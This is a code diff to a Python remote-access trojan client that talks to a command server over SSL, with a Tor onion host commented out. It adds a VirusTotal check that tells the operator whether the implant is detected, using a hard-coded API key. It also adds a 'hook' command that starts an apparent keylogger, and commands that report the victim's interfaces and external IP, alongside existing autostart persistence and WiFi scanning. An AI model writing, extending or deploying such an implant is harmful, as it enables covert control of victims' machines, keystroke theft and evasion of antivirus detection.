@@ -1,4 +1,5 @@
-import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, inspect,urllib2, os.path, base64, getpass, zipfile
+import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, simplejson
+import inspect, urllib2, os.path, base64, getpass, zipfile, urllib, netifaces
 from colored import fg, bg, attr
 from subprocess import Popen, PIPE, STDOUT
 from wifi import Cell, Scheme
@@ -30,15 +31,77 @@ class PKCS7Encoder():
 encoder = PKCS7Encoder()
 #host = 'hcjczulezpxxfw2n.onion'
 host = '127.0.0.1'
-cType = "client000-crypto"
+cType = "client000-crypto" #client Type
+#VTresponse = ""
+
+######### virtus-total check
+VTurl = "https://www.virustotal.com/vtapi/v2/file/report"
+with open(os.path.basename(__file__) , "rb") as thisFile:
+    HF = hashlib.sha256()
+    HF.update(thisFile.read())
+    thisHash = HF.hexdigest()
+
+# to get your apikey, log in virustotal
+parameters = {"resource": thisHash, "apikey": "d94a59a2050391cf84f417f827769b622812f6ad59b8f50efd788f6de8d20341"}
+response = urllib2.urlopen(urllib2.Request(VTurl, urllib.urlencode(parameters)))
+jReport = response.read()
+
+# extract some data
+response_dict = simplejson.loads(jReport)
+rPositives = response_dict.get("positives",{})
+rPositives = 0
+# check VT stauts
+if str(rPositives) != "{}":
+    if rPositives == 0:
+        VTresponse = "VTcheck: safe | scanned \n" + "|--- sha256: " + thisHash
+    elif 0 < rPositives:
+        VTresponse = "VTcheck: not-safe | scanned: "+str(rPositives) + "\n|--- sha256: " + thisHash
+    else:
+        VTresponse = "VTcheck: error occurred"
+else:
+    VTresponse = "VTcheck: probably safe | not scanned \n|--- sha256: " + thisHash
+
 
 # sysinfo
 uname = platform.uname()[0:3]
 
+#HOOK
+HKstat = "OFF"
+def HOOK(status):
+    global HKstat
+    if status == "check":
+        return HKstat
+    elif status == "ON":
+        if status == HKstat:
+            report = "Already running"
+            return report
+        else:
+            global HOOKER
+            HOOKER = Popen("python ex2.py >> 2016.txt", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+            HKstat = "ON"
+            return HKstat
+    elif status == "OFF":
+        if status == HKstat:
+            report = "Already stopped"
+            return report
+        else:
+            try:
+                HOOKER.kill()
+                HKstat = "OFF"
+                return HKstat
+            except:
+                statReturn = "Something went wrong, HKstat= " + HKstat
+                return statReturn
+    else:
+        statReturn = "Something went wrong, HKstat= " + HKstat
+        return statReturn
+
+# getting target IP
 try:
     myIP = urllib2.urlopen("http://myexternalip.com/raw").read()[0:-1]
 except:
     myIP = "Error! Can't check IP!"
+
 def RecvData():
     temp = ssl_sock.read()
     return temp
@@ -256,16 +319,17 @@ while 1:
     elif inText == "info":
         SendData(str(uname))
         SendData('ip:'+myIP)
+        SendData(VTresponse)
         SendData("end-info")
     elif inText.startswith("set"):
         if inText.split(":")[1]== "autostart":
             if platform.system() == "Linux":
                 SendData("LinuxAutoStart: " +LinuxAutoStart())
+                pass
             elif platform.system() == "Windows":
                 SendData("WindowsAutoStart: "+WindowsAutoStart())
             else: # at the moment os x not supported
                 SendData("No Windows/Linux system")
-                pass
         else:
             SendData("usage: set:autostart")
             pass
@@ -274,6 +338,11 @@ while 1:
     elif inText == "terminate":
         ssl_sock.close()
         sys.exit(0)
+    elif inText.startswith("hook"):
+        hookstat = HOOK(inText.split(':')[1])
+        SendData(hookstat)
+    elif inText == "get-inferfaces":
+        SendData(str(netifaces.interfaces()))
     elif inText.startswith("ScanWIFI"):
         ScanWIFI(inText.split(':')[1])
     elif inText.startswith('protect'):
